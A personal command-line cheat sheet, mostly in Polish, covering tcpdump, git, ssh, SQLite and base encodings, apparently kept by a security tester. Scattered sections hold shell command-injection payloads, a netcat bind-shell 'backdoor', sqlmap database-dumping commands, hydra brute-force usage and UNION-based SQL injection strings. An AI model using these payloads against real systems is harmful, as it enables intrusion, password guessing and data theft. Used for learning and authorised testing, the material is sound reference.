+Jak łatwo wyłapać i zalogować pakiety NetBIOS, rozsyłane ze słabo zabezpieczonych stacji z systemem Microsoft Windows? Pakiety te przenosi protokół TCP i UDP a numery portów to zakres od 137 do 139. Mamy już w zasadzie wszystko co potrzeba do skonstruowania warunku:
+
+tcpdump -i xl0 -w /tmp/zrzut05.dmp \(tcp or udp\) and
+        \(dst port 137 or dst port 138 or dst port 139\)
+
+
+Odczyt z pliku:
+tcpdump -r logfilename -x -X
+
+###############################################################################
+{bash}{shell}
+###############################################################################
+
+shell command injections - metody
+
+Polecenie wyjściowe:
+$ ping -c 1 127.0.0.1
+
+Payloady:
+$ ping -c 1 127.0.0.1; ls -l
+$ ping -c 1 127.0.0.1 && ls -l
+$ ping -c 1 aaaa || ls -l
+$ ping -c 1 127.0.0.1 `ls -l`
+$ ping -c 1 127.0.0.1 $(ls -l)
+
+Emulacja spacji:
+
+${IFS} - internal fields separator
+$ echo${IFS}test${IFS}test2
+test test2
+
+Rozwijanie wyrażeń w nawiasach {}:
+$ echo a{1..5}b
+a1b a2b a3b a4b a5b
+
+$ echo plik{1,2,3,4}.jpg
+plik1.jpg plik2.jpg plik3.jpg plik4.jpg
+
+Wykonanie polecenia bez spacji:
+$ {ls,-lA}
+
+###############################################################################
+{bash}{port}{scanner}
+###############################################################################
+
+for p in {1..1023}; do (echo >/dev/tcp/[HOST]/$p) >/dev/null 2>&1 && echo "$p open"; done 
+
+###############################################################################
+{git}
+###############################################################################
+
+ Global settings
+git config --global color.ui true
+
+ Eksport czystego repo git:    
+git checkout-index -a -f --prefix=/var/www/sva-clean/
+
+ Utworzenie nowego brancha ze wskazanego commita:
+git checkout -b <branch-name> <commit-SHA1>
+
+example:
+git checkout -b t3437 1085a0e7dbb8d3bbd1e2b400a61ec61a6ed3e777
+
+
+{amend} To amend the previous commit, make the changes you want and stage those changes, and then run
+git commit --amend
+
+To amend the previous commit and keep the same log message, run
+git commit --amend -C HEAD
+
+To fix the previous commit by removing it entirely, run
+git reset --hard HEAD^
+
+If you want to edit more than one commit message, run
+git rebase -i HEAD~commit_count
+
+Replace commit_count with number of commits that you want to edit.
+This command launches your editor. Mark the first commit (the one that you want to change) 
+as “edit” instead of “pick”, then save and exit your editor.
+Make the change you want to commit and then run
+git commit --amend
+git rebase --continue
+
+{git log}
+git log
+git log -p  (with diff)
+git log --stat
+git log --stat --pretty=oneline
+git log -p --stat --pretty=oneline
+git log --graph
+git log --author="bl4de"
+git log --grep="controller"
+
+{git}{git log file}
+git log -p --color -- public/css/editors.less
+
+{git diff}
+git diff (before git add .)
+git diff --cached (after git add)
+git diff --color --full-index
+
+
+git reset HEAD <plik>... żeby usunąć plik z poczekalni
+
+git remote -v   (full path to repo)
+git remote show origin
+
+{git tag}
+git tag (lista dostpenych tagow)
+git tag -l "dev*" (wyszukiwanie tagow po wzorcu)
+
+$ git tag
+v0.1
+v0.3
+$ git tag -a v1.4 -m 'my version 1.4'   (tworzenie taga)
+$ git tag
+v0.1
+v1.3
+v1.4
+
+$ git show v1.4
+tag v1.4
+Tagger: Scott Chacon <schacon@gee-mail.com>
+Date:   Mon Feb 9 14:45:11 2009 -0800
+
+my version 1.4
+commit 15027957951b64cf874c3557a0f3547bd83b3ff6
+Merge: 4a447f7... a6b4c97...
+Author: Scott Chacon <schacon@gee-mail.com>
+Date:   Sun Feb 8 19:02:46 2009 -0800
+
+    Merge branch 'experiment'
+
+$ git tag -a v1.2 9fceb02 (tagowanie wskazanej rewizji)
+$ git push origin v1.5  (pushowanie taga)
+$ git push origin --tags  (pushowanie wszystkich tagow)
+
+{alias}
+Aliasy
+
+Git nie wydedukuje sam polecenia jeśli wpiszesz je częściowo i wciśniesz Enter. Jeśli nie chcesz w całości wpisywać całego tekstu polecenia możesz łatwo stworzyć dla niego alias używając git config. Oto kilka przykładów, które mogą ci się przydać:
+
+$ git config --global alias.co checkout
+$ git config --global alias.br branch
+$ git config --global alias.ci commit
+$ git config --global alias.st status
+
+Oznacza to, że na przykład, zamiast wpisywać git commit, wystarczy, że wpiszesz git ci. Z czasem zaczniesz też stosować także inne polecenia regularnie, nie wahaj się wówczas tworzyć sobie dla nich nowych aliasów.
+
+Technika ta jest także bardzo przydatna do tworzenia poleceń, które uważasz, że powinny istnieć a których brakuje ci w zwięzłej formie. Na przykład, aby skorygować problem z intuicyjnością obsługi usuwania plików z poczekalni, możesz dodać do Gita własny, ułatwiający to alias:
+
+$ git config --global alias.unstage 'reset HEAD --'
+
+W ten sposób dwa poniższe polecenia są sobie równoważne:
+
+$ git unstage fileA
+$ git reset HEAD fileA
+
+Od razu polecenie wygląda lepiej. Dość częstą praktyką jest także dodawanie polecenia last:
+
+$ git config --global alias.last 'log -1 HEAD'
+
+Możesz dzięki niemu łatwo zobaczyć ostatnią rewizję:
+
+$ git last
+commit 66938dae3329c7aebe598c2246a8e6af90d04646
+Author: Josh Goebel <dreamer3@example.com>
+Date:   Tue Aug 26 19:48:51 2008 +0800
+
+    test for current head
+
+    Signed-off-by: Scott Chacon <schacon@example.com>
+
+
+###############################################################################
+{sed}
+###############################################################################
+
+1) interactive substitution:
+
+$ echo hack the world | sed ‘s/world/planet/’   -> hack the planet
+
+@) substitute in the file:
+
+$ sed -i 's/world/planet/' HackThePlanet.txt      (Linux)
+$ sed -i '' s/world/planet/' HackThePlanet.txt    (OSX)
+
+###############################################################################
+{xargs}
+###############################################################################
+
+$ echo 1 2 3 4 | xargs
+$ echo 1 2 3 4 | xargs -n 2
+
+$ find . -name \*.txt | xargs cat
+
+$ find . -name "*.bak" -print0 | xargs -0 -I {} mv {} ~/old.files
+$ find . -name "*.bak" -print0 | xargs -0 -I file mv file ~/old.files
+$ find /share/media/mp3/ -type f -name "*.mp3" -print0 | xargs -0 -r -I file cp -v -p file --target-directory=/bakup/iscsi/mp3
+
+{}, file - the argument list makers
+
+-0 If there are blank spaces or characters (including newlines) many commands will not work. This option take cares of file names with blank space.
+-I Replace occurrences of replace-str in the initial-arguments with names read from standard input. Also, unquoted blanks do not terminate input items; instead the separator is the newline character.
+
+###############################################################################
+{scp}
+###############################################################################
+
+-r recursive
+-P XX port XX
+
+
+Copy local file to remote machine:
+   scp /path/to/file user@host:/path/to/file
+
+Copy local directory with mask to remote machine:
+   scp -r /path/to/dir user@domain.ext:/path/to/dir/
+
+Copy remote file to local machine:
+   scp user@domain.ext:/path/to/file /path/to/file
+
+Copy remote files with mask to local machine:
+   scp user@domain.ext:/path/to/dir/\* /path/to/dir
+
+Copy remote directory to local machine:
+   scp -r user@domain.ext:/path/to/dir /path/to/dir
+   scp -P 2233 -r user@domain.ext:/path/to/dir /path/to/dir
+
+###############################################################################
+{ssh}
+###############################################################################
+
+logowanie z użyciem konkretnego klucza:
+ssh -i klucz user@host
+
+tunel SSH
+ssh user@HOST_ZDALNY -L PORT_LOKALNY:[HOST_ZDALNY/localhost]:PORT_LOKALNY
+
+PORT_LOKALNY - port, na którym nasłuchuje tunel
+HOST_ZDALNY/localhost - host zdalny ('localhost', bo jest on dla siebie lokalem)
+PORT_LOKALNY - port 'localhost'a, czyli zdalnego :)
+
+ssh user@111.111.111.111 -L 8080:localhost:80
+port 80 hosta 111.111.111.111 jest dostepny na porcie 8080
+
+
+
+###############################################################################
+{siege} 
+###############################################################################
+
+Siege is an http/https regression testing and benchmarking utility.
+
+$ siege -g www.google.com 
+GET / HTTP/1.1 
+Host: www.google.com 
+User-Agent: JoeDog/1.00 [en] (X11; I; Siege 2.70) 
+Connection: close
+
+$ siege -c20 www.google.co.uk -b -t30s 
+... 
+Lifting the server siege... done. 
+Transactions: 1400 hits 
+Availability: 100.00 % 
+Elapsed time: 29.22 secs
+...
+
+###############################################################################
+{netcat}{nc}
+###############################################################################
+
+Netcat, or nc, is a self-described networking Swiss Army knife. It’s a very simple but also very powerful and versatile application that allows you to create arbitrary network connections. Here we see it being used as a port scanner:
+$ nc -z example.com 20-100 
+Connection to example.com 22 port [tcp/ssh] succeeded! 
+Connection to example.com 80 port [tcp/http] succeeded!
+
+In addition to creating arbitrary connections, Netcat can also listen for incoming connections. Here we use this feature of nc, combined with tar, to very quickly and efficiently copy files between servers. On the server, run:
+$ nc -l 9090 | tar -xzf -
+
+And on the client:
+$ tar -czf dir/ | nc server 9090
+
+We can use Netcat to expose any application over the network. Here we expose a shell over port 8080:
+$ mkfifo backpipe 
+$ nc -l 8080 0<backpipe | /bin/bash > backpipe
+
+We can now access the server from any client:
+$ nc example.com 8080 
+uname -a 
+Linux li228-162 2.6.39.1-linode34 ##1 SMP Tue Jun 21 10:29:24 EDT 2011 i686 GNU/Linux
+
+While the last two examples are slightly contrived (in reality you’d be more likely to use tools such as rsync to copy files and SSH to remotely access a server), they do show the power and flexibility of Netcat, and hint at all of the different things you can achieve by combining Netcat with other applications.
+
+{netcat}{nc}{shell}
+Getting the Backdoor to Work on Unix/Linux
+
+nc -nvv -l -p -e /bin/sh <port of choice>
+
+-l stay open and listen
+-p what port to listen to
+-e /bin/sh spawns a shell
+
+
+
+###############################################################################
+{mysql}{log}
+###############################################################################
+
+logi w MySQL
+w pliku my.cnf:
+
+# Be aware that this log type is a performance killer.
+# As of 5.1 you can enable the log at runtime!
+general_log_file        = /var/log/mysql/mysql.log
+general_log             = 1
+
+set/change root password
+
+$ mysqladmin -u root password NEWPASSWORD
+$ mysqladmin -u root -p'oldpassword' password newpass
+
+###############################################################################
+{mount}{usb}
+###############################################################################
+
+root@bl4de:/home/rafal# mkdir -p /mnt/sdb1
+root@bl4de:/home/rafal#  mount -t auto /dev/sdb1 /mnt/sdb1
+root@bl4de:/home/rafal# cd /mnt/sdb1
+root@bl4de:/mnt/sdb1# ll
+razem 0
+root@bl4de:/mnt/sdb1# 
+
+###############################################################################
+{mp4}{flv}{ffmpeg}
+###############################################################################
+
+szybka konwersja flv -> mp4
+ffmpeg -i input.flv -vcodec copy -acodec copy output.mp4
+
+{avi}{mencoder} łączenie avi filesów
+mencoder -ovc lavc -nosound input1.avi input2.avi -o output.avi
+
+###############################################################################
+{CSS}
+###############################################################################
+
+Style sheet cascade order
+
+1. Browser declarations
+2. User normal declarations
+3. Author normal declarations
+4. Author important declarations
+5. User important declarations
+
+###############################################################################
+{screen}
+###############################################################################
+
+screen -mL		creates new session and start logging
+[CTRL+A / D] 	quit from screen session
+screen -ls		list of screen sessions
+screen -r [SESSION_NUMBER]	go into session
+screen -D -r [SESSION_NUMBER] back to detached screen session
+screen -U     new screen in UTF8 (or screen -rU restore screen with UTF8)
+
+Kill screen:
+screen -X -S ID kill
+
+Remove screen:
+
+$ screen -r #screen_no
+CTRL+A
+:quit
+
+###############################################################################
+{base64}
+###############################################################################
+
+$ echo U3lkQmFycmV0dA== | base64 -D
+
+decodes Base64 input from stdin
+
+###############################################################################
+{sqlmap}
+###############################################################################
+
+Basic syntax:
+
+sqlmap -u <URL> -p <injection parameter> [options]
+sqlmap -u 'http://192.168.1.1/page.php?id=1' -p id --technique=U    // UNION-based
+sqlmap -u 'http://192.168.1.1/page.php' --data='<POST body>' -p <injection parameter> 	// POST
+
+
+Basic usage (find databases):
+
+sqlmap -u http://192.168.1.2/kzMb5nVYJw/420search.php?usrtosearch= --dbms=MySQL --level=2 --dbs
+
+(find tables):
+
+sqlmap -u http://192.168.1.2/kzMb5nVYJw/420search.php?usrtosearch= --dbms=MySQL --level=2 --tables -D databasename
+
+(dump data from databasename sampletable):
+
+sqlmap -u http://192.168.1.2/kzMb5nVYJw/420search.php?usrtosearch= --dbms=MySQL --level=2 --dump -D databasename -T sampletable
+
+Automated attack from saved request.
+Save request from Burp as file, then:
+
+$ sqlmap.py -r saved_request.txt -p [input-name]
+
+
+###############################################################################
+{POST}{HTTP}
+###############################################################################
+
+Format of POST multipart/form-data request:
+
+
+POST /path/to/script.php HTTP/1.0
+Host: example.com
+Content-type: multipart/form-data, boundary=AaB03x
+Content-Length: $requestlen
+
+--AaB03x
+content-disposition: form-data; name="field1"
+
+$field1
+--AaB03x
+content-disposition: form-data; name="field2"
+
+$field2
+--AaB03x
+content-disposition: form-data; name="userfile"; filename="$filename"
+Content-Type: $mimetype
+Content-Transfer-Encoding: binary
+
+$binarydata
+--AaB03x--
+
+
+
+https://gist.github.com/bl4de/dcf0a338b84b3beb8809fefd8c7145df
+
+Suppose the server supplies the following HTML:
+
+<FORM ACTION="http://server.dom/cgi/handle"
+     ENCTYPE="multipart/form-data"
+     METHOD=POST>
+What is your name? <INPUT TYPE=TEXT NAME=submitter>
+What files are you sending? <INPUT TYPE=FILE NAME=pics>
+</FORM>
+
+and the user types "Joe Blow" in the name field, and selects a text
+file "file1.txt" for the answer to 'What files are you sending?'
+
+The client might send back the following data:
+
+  Content-type: multipart/form-data, boundary=AaB03x
+
+  --AaB03x
+  content-disposition: form-data; name="field1"
+
+  Joe Blow
+  --AaB03x
+  content-disposition: form-data; name="pics"; filename="file1.txt"
+  Content-Type: text/plain
+
+   ... contents of file1.txt ...
+  --AaB03x--
+
+If the user also indicated an image file "file2.gif" for the answer
+to 'What files are you sending?', the client might client might send
+back the following data:
+
+  Content-type: multipart/form-data, boundary=AaB03x
+
+  --AaB03x
+  content-disposition: form-data; name="field1"
+
+  Joe Blow
+  --AaB03x
+  content-disposition: form-data; name="pics"
+  Content-type: multipart/mixed, boundary=BbC04y
+
+  --BbC04y
+  Content-disposition: attachment; filename="file1.txt"
+
+  Content-Type: text/plain
+
+  ... contents of file1.txt ...
+  --BbC04y
+  Content-disposition: attachment; filename="file2.gif"
+  Content-type: image/gif
+  Content-Transfer-Encoding: binary
+
+    ...contents of file2.gif...
+  --BbC04y--
+  --AaB03x--
+
+http://www.faqs.org/rfcs/rfc1867.html
+
+###############################################################################
+{hydra}
+###############################################################################
+
+Basic usage
+
+hydra -V -t 10 -l aaaa -P passwords.txt 192.168.1.142 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" 
+
+-l login
+-L files with logins
+-p, -P for passwords
+
+http-form-post"/path/form.html:username=^USER^&password=^PASS^:invalid login and/or password text from page"
+
+username and password => form field names, above only samples !
+
+
+hydra -U PROTOCOL
+check if the module has optional parameters
+
+With -l for login and -p for password you tell hydra that this is the only
+login and/or password to try.
+With -L for logins and -P for passwords you supply text files with entries.
+e.g.:
+  hydra -l admin -p password ftp://localhost/
+  hydra -L default_logins.txt -p test ftp://localhost/
+  hydra -l admin -P common_passwords.txt ftp://localhost/
+  hydra -L logins.txt -P passwords.txt ftp://localhost/
+
+bruteforce mode with the -x option (which you can not
+use with -p/-P/-C):
+  -x minimum_length:maximum_length:charset
+the charset definition is 'a' for lowercase letters, 'A' for uppercase letters,
+'1' for numbers and for anything else you supply it is their real representation.
+Examples:
+  -x 1:3:a generate passwords from length 1 to 3 with all lowercase letters
+  -x 2:5:/ generate passwords from length 2 to 5 containing only slashes
+  -x 5:8:A1 generate passwords from length 5 to 8 with uppercase and numbers
+Example:
+  hydra -l ftp -x 3:3:a ftp://localhost/
+
+special option of a module, type:
+  hydra -U <module>
+e.g.
+  ./hydra -U http-post-form
+
+
+###############################################################################
+{sqlite}
+###############################################################################
+
+Let's start with typing a simple sqlite3 command at command prompt which will provide you SQLite command prompt where you will issue various SQLite commands.
+
+$sqlite3
+SQLite version 3.3.6
+Enter ".help" for instructions
+sqlite>
+For a listing of the available dot commands, you can enter ".help" at any time. For example:
+
+sqlite>.help
+Above command will display a list of various important SQLite dot commands, which are as follows:
+
+Command	Description
+.backup ?DB? FILE	Backup DB (default "main") to FILE
+.bail ON|OFF	Stop after hitting an error. Default OFF
+.databases	List names and files of attached databases
+.dump ?TABLE?	Dump the database in an SQL text format. If TABLE specified, only dump tables matching LIKE pattern TABLE.
+.echo ON|OFF	Turn command echo on or off
+.exit	Exit SQLite prompt
+.explain ON|OFF	Turn output mode suitable for EXPLAIN on or off. With no args, it turns EXPLAIN on.
+.header(s) ON|OFF	Turn display of headers on or off
+.help	Show this message
+.import FILE TABLE	Import data from FILE into TABLE
+.indices ?TABLE?	Show names of all indices. If TABLE specified, only show indices for tables matching LIKE pattern TABLE.
+.load FILE ?ENTRY?	Load an extension library
+.log FILE|off	Turn logging on or off. FILE can be stderr/stdout
+.mode MODE	Set output mode where MODE is one of:
+csv Comma-separated values
+
+column Left-aligned columns.
+
+html HTML <table> code
+
+insert SQL insert statements for TABLE
+
+line One value per line
+
+list Values delimited by .separator string
+
+tabs Tab-separated values
+
+tcl TCL list elements
+
+.nullvalue STRING	Print STRING in place of NULL values
+.output FILENAME	Send output to FILENAME
+.output stdout	Send output to the screen
+.print STRING...	Print literal STRING
+.prompt MAIN CONTINUE	Replace the standard prompts
+.quit	Exit SQLite prompt
+.read FILENAME	Execute SQL in FILENAME
+.schema ?TABLE?	Show the CREATE statements. If TABLE specified, only show tables matching LIKE pattern TABLE.
+.separator STRING	Change separator used by output mode and .import
+.show	Show the current values for various settings
+.stats ON|OFF	Turn stats on or off
+.tables ?PATTERN?	List names of tables matching a LIKE pattern
+.timeout MS	Try opening locked tables for MS milliseconds
+.width NUM NUM	Set column widths for "column" mode
+.timer ON|OFF	Turn the CPU timer measurement on or off
+Let's try .show command to see default setting for your SQLite command prompt.
+
+sqlite>.show
+     echo: off
+  explain: off
+  headers: off
+     mode: column
+nullvalue: ""
+   output: stdout
+separator: "|"
+    width:
+sqlite>
+Make sure there is no space in between sqlite> prompt and dot command, otherwise it will not work.
+Formatting output
+You can use the following sequence of dot commands to format your output the way I have listed down in this tutorial:
+
+sqlite>.header on
+sqlite>.mode column
+sqlite>.timer on
+sqlite>
+Above setting will produce the output in the following format:
+
+ID          NAME        AGE         ADDRESS     SALARY
+----------  ----------  ----------  ----------  ----------
+1           Paul        32          California  20000.0
+2           Allen       25          Texas       15000.0
+3           Teddy       23          Norway      20000.0
+4           Mark        25          Rich-Mond   65000.0
+5           David       27          Texas       85000.0
+6           Kim         22          South-Hall  45000.0
+7           James       24          Houston     10000.0
+CPU Time: user 0.000000 sys 0.000000
+The sqlite_master Table
+The master table holds the key information about your database tables and it is called sqlite_master. You can see its schema as follows:
+
+sqlite>.schema sqlite_master
+This will produce the following result:
+
+CREATE TABLE sqlite_master (
+  type text,
+  name text,
+  tbl_name text,
+  rootpage integer,
+  sql text
+);
+
+
+SQLite is followed by unique set of rules and guidelines called Syntax. This tutorial gives you a quick start with SQLite by listing all the basic SQLite Syntax.
+
+Case Sensitivity
+Important point to be noted is that SQLite is case insensitive, but there are some commands, which are case sensitive like GLOB and glob have different meaning in SQLite statements.
+
+Comments
+SQLite comments are extra notes, which you can add in your SQLite code to increase its readability and they can appear anywhere; whitespace can occur, including inside expressions and in the middle of other SQL statements but they can not be nested.
+
+SQL comments begin with two consecutive "-" characters (ASCII 0x2d) and extend up to and including the next newline character (ASCII 0x0a) or until the end of input, whichever comes first.
+
+You can also use C-style comments, which begin with "/*" and extend up to and including the next "*/" character pair or until the end of input, whichever comes first. C-style comments can span multiple lines.
+
+sqlite>.help -- This is a single line comment
+SQLite Statements
+All the SQLite statements start with any of the keywords like SELECT, INSERT, UPDATE, DELETE, ALTER, DROP, etc., and all the statements end with a semicolon (;).
+
+SQLite ANALYZE Statement:
+ANALYZE;
+or
+ANALYZE database_name;
+or
+ANALYZE database_name.table_name;
+SQLite AND/OR Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  CONDITION-1 {AND|OR} CONDITION-2;
+SQLite ALTER TABLE Statement:
+ALTER TABLE table_name ADD COLUMN column_def...;
+SQLite ALTER TABLE Statement (Rename):
+ALTER TABLE table_name RENAME TO new_table_name;
+SQLite ATTACH DATABASE Statement:
+ATTACH DATABASE 'DatabaseName' As 'Alias-Name';
+SQLite BEGIN TRANSACTION Statement:
+BEGIN;
+or
+BEGIN EXCLUSIVE TRANSACTION;
+SQLite BETWEEN Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  column_name BETWEEN val-1 AND val-2;
+SQLite COMMIT Statement:
+COMMIT;
+SQLite CREATE INDEX Statement :
+CREATE INDEX index_name
+ON table_name ( column_name COLLATE NOCASE );
+SQLite CREATE UNIQUE INDEX Statement :
+CREATE UNIQUE INDEX index_name
+ON table_name ( column1, column2,...columnN);
+SQLite CREATE TABLE Statement:
+CREATE TABLE table_name(
+   column1 datatype,
+   column2 datatype,
+   column3 datatype,
+   .....
+   columnN datatype,
+   PRIMARY KEY( one or more columns )
+);
+SQLite CREATE TRIGGER Statement :
+CREATE TRIGGER database_name.trigger_name 
+BEFORE INSERT ON table_name FOR EACH ROW
+BEGIN 
+   stmt1; 
+   stmt2;
+   ....
+END;
+SQLite CREATE VIEW Statement :
+CREATE VIEW database_name.view_name  AS
+SELECT statement....;
+SQLite CREATE VIRTUAL TABLE Statement:
+CREATE VIRTUAL TABLE database_name.table_name USING weblog( access.log );
+or
+CREATE VIRTUAL TABLE database_name.table_name USING fts3( );
+SQLite COMMIT TRANSACTION Statement:
+COMMIT;
+SQLite COUNT Clause:
+SELECT COUNT(column_name)
+FROM   table_name
+WHERE  CONDITION;
+SQLite DELETE Statement:
+DELETE FROM table_name
+WHERE  {CONDITION};
+SQLite DETACH DATABASE Statement:
+DETACH DATABASE 'Alias-Name';
+SQLite DISTINCT Clause:
+SELECT DISTINCT column1, column2....columnN
+FROM   table_name;
+SQLite DROP INDEX Statement :
+DROP INDEX database_name.index_name;
+SQLite DROP TABLE Statement:
+DROP TABLE database_name.table_name;
+SQLite DROP VIEW Statement :
+DROP INDEX database_name.view_name;
+SQLite DROP TRIGGER Statement :
+DROP INDEX database_name.trigger_name;
+SQLite EXISTS Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  column_name EXISTS (SELECT * FROM   table_name );
+SQLite EXPLAIN Statement :
+EXPLAIN INSERT statement...;
+or 
+EXPLAIN QUERY PLAN SELECT statement...;
+SQLite GLOB Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  column_name GLOB { PATTERN };
+SQLite GROUP BY Clause:
+SELECT SUM(column_name)
+FROM   table_name
+WHERE  CONDITION
+GROUP BY column_name;
+SQLite HAVING Clause:
+SELECT SUM(column_name)
+FROM   table_name
+WHERE  CONDITION
+GROUP BY column_name
+HAVING (arithematic function condition);
+SQLite INSERT INTO Statement:
+INSERT INTO table_name( column1, column2....columnN)
+VALUES ( value1, value2....valueN);
+SQLite IN Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  column_name IN (val-1, val-2,...val-N);
+SQLite Like Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  column_name LIKE { PATTERN };
+SQLite NOT IN Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  column_name NOT IN (val-1, val-2,...val-N);
+SQLite ORDER BY Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  CONDITION
+ORDER BY column_name {ASC|DESC};
+SQLite PRAGMA Statement:
+PRAGMA pragma_name;
+
+For example:
+
+PRAGMA page_size;
+PRAGMA cache_size = 1024;
+PRAGMA table_info(table_name);
+SQLite RELEASE SAVEPOINT Statement:
+RELEASE savepoint_name;
+SQLite REINDEX Statement:
+REINDEX collation_name;
+REINDEX database_name.index_name;
+REINDEX database_name.table_name;
+SQLite ROLLBACK Statement:
+ROLLBACK;
+or
+ROLLBACK TO SAVEPOINT savepoint_name;
+SQLite SAVEPOINT Statement:
+SAVEPOINT savepoint_name;
+SQLite SELECT Statement:
+SELECT column1, column2....columnN
+FROM   table_name;
+SQLite UPDATE Statement:
+UPDATE table_name
+SET column1 = value1, column2 = value2....columnN=valueN
+[ WHERE  CONDITION ];
+SQLite VACUUM Statement:
+VACUUM;
+SQLite WHERE Clause:
+SELECT column1, column2....columnN
+FROM   table_name
+WHERE  CONDITION;
+
+
+{SQLi}{SQLInjection}{SQL Injection}
+
+Retrieve database version:
+
+1 UNION ALL SELECT NULL,version()--
+Retrieve database names:
+
+1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
+Retrieve table names:
+
+1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--
+Retrieve column names:
+
+1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'--
+Retrieve data:
+
+1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1--
+Retrieve data from another database:
+
+1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM database2.table1--
+
+
+
+###############################################################################
+{base64} https://tools.ietf.org/html/rfc4648
+###############################################################################
+
+The Base 64 Alphabet (base64):
+
+Value Encoding  Value Encoding  Value Encoding  Value Encoding
+         0 A            17 R            34 i            51 z
+         1 B            18 S            35 j            52 0
+         2 C            19 T            36 k            53 1
+         3 D            20 U            37 l            54 2
+         4 E            21 V            38 m            55 3
+         5 F            22 W            39 n            56 4
+         6 G            23 X            40 o            57 5
+         7 H            24 Y            41 p            58 6
+         8 I            25 Z            42 q            59 7
+         9 J            26 a            43 r            60 8
+        10 K            27 b            44 s            61 9
+        11 L            28 c            45 t            62 +
+        12 M            29 d            46 u            63 /
+        13 N            30 e            47 v
+        14 O            31 f            48 w         (pad) =
+        15 P            32 g            49 x
+        16 Q            33 h            50 y
+
+The "URL and Filename safe" Base 64 Alphabet (base64url):
+
+Value Encoding  Value Encoding  Value Encoding  Value Encoding
+         0 A            17 R            34 i            51 z
+         1 B            18 S            35 j            52 0
+         2 C            19 T            36 k            53 1
+         3 D            20 U            37 l            54 2
+         4 E            21 V            38 m            55 3
+         5 F            22 W            39 n            56 4
+         6 G            23 X            40 o            57 5
+         7 H            24 Y            41 p            58 6
+         8 I            25 Z            42 q            59 7
+         9 J            26 a            43 r            60 8
+        10 K            27 b            44 s            61 9
+        11 L            28 c            45 t            62 - (minus)
+        12 M            29 d            46 u            63 _
+        13 N            30 e            47 v           (underline)
+        14 O            31 f            48 w
+        15 P            32 g            49 x
+        16 Q            33 h            50 y         (pad) =
+
+
+How string 'Audi' is encoded into Base 64 value:
+
+1. Split data into 8-bits chunks/signs:
+
+A u d i
+
+2. Get 8-bit value of each chunk:
+
+65 117 100 105
+
+3. Get bits:
+
+01000001 01110101 01100100 01101001
+
+4. Divide above bits into groups of 4 * 6-bits chunks. If there's not enough, add padding (=)
+
+010000 010111 010101 100100  | 011010 010000 ------ -------  | <- last two is padding
+
+5. Assign values from Base64 table:
+
+16 23 21 36   26 16 = =
+
+6. Final Base64 encoded:
+
+QXVkaQ==
+
+
+
+###############################################################################
+{base32} https://tools.ietf.org/html/rfc4648
+###############################################################################
+
+
+The Base 32 Alphabet (base32)
+
+     Value Encoding  Value Encoding  Value Encoding  Value Encoding
+         0 A             9 J            18 S            27 3
+         1 B            10 K            19 T            28 4
+         2 C            11 L            20 U            29 5
+         3 D            12 M            21 V            30 6
+         4 E            13 N            22 W            31 7
+         5 F            14 O            23 X
+         6 G            15 P            24 Y         (pad) =
+         7 H            16 Q            25 Z
+         8 I            17 R            26 2
+
+
+
+A 33-character subset of US-ASCII is used, enabling 5 bits to be
+   represented per printable character.  (The extra 33rd character, "=",
+   is used to signify a special processing function.)
+
+   The encoding process represents 40-bit groups of input bits as output
+   strings of 8 encoded characters.  Proceeding from left to right, a
+   40-bit input group is formed by concatenating 5 8bit input groups.
+   These 40 bits are then treated as 8 concatenated 5-bit groups, each
+   of which is translated into a single character in the base 32
+   alphabet.  When a bit stream is encoded via the base 32 encoding, the
+   bit stream must be presumed to be ordered with the most-significant-
+   bit first.  That is, the first bit in the stream will be the high-
+   order bit in the first 8bit byte, the eighth bit will be the low-
+   order bit in the first 8bit byte, and so on.
+
+
+The "Extended Hex" Base 32 Alphabet (base32hex)
+
+         Value Encoding  Value Encoding  Value Encoding  Value Encoding
+             0 0             9 9            18 I            27 R
+             1 1            10 A            19 J            28 S
+             2 2            11 B            20 K            29 T
+             3 3            12 C            21 L            30 U
+             4 4            13 D            22 M            31 V
+             5 5            14 E            23 N
+             6 6            15 F            24 O         (pad) =
+             7 7            16 G            25 P
+             8 8            17 H            26 Q
+			 
+			 
+
+###############################################################################
+{base16} https://tools.ietf.org/html/rfc4648
+###############################################################################
+
+A 16-character subset of US-ASCII is used, enabling 4 bits to be
+   represented per printable character.
+   
+   
+The Base 16 Alphabet
+
+         Value Encoding  Value Encoding  Value Encoding  Value Encoding
+             0 0             4 4             8 8            12 C
+             1 1             5 5             9 9            13 D
+             2 2             6 6            10 A            14 E
+             3 3             7 7            11 B            15 F
+
+   Unlike base 32 and base 64, no special padding is necessary since a
+   full code word is always available.
+   
+
+###############################################################################
+{SMTP}
+###############################################################################
+
+SMTP uses several commands to communicate with mail servers. These commands are described below.
+
+Note: The commands are not case sensitive, which means you can use either Mail or MAIL. However, remember that mail addresses are case sensitive.
+
+The basic SMTP commands are:
+
+HELO
+-- Initiates a conversation with the mail server. When using this command you can specify your domain name so that the mail server knows who you are. For example, HELO mailhost2. cf.ac.uk.
+MAIL
+-- Indicates who is sending the mail. For example,
+MAIL FROM: <dave@cs.cf.ac.uk>.
+
+Remember this is not going to be your name -- it's the name of the person who is sending the mail message. Any returned mail will be sent back to this address.
+
+RCPT
+-- Indicates who is recieving the mail. For example,
+RCPT TO: <user@email.com>. You can indicate more than one user by issuing multiple RCPT commands.
+
+DATA
+-- Indicates that you are about to send the text (or body) of the message. The message text must end with the following five letter sequence: "\r\n.\r\n."
+QUIT
+-- Indicates that the conversation is over.
+EXPN
+-- Indicates that you are using a mailing list.
+HELP
+-- Asks for help from the mail server.
+NOOP
+-- Does nothing other than get a reponse from the mail server. RSETAborts the current conversation.
+SEND
+-- Sends a message to a user's terminal instead of a mailbox.
+SAML
+-- Sends a message to a user's terminal and to a user's mailbox.
+SOML
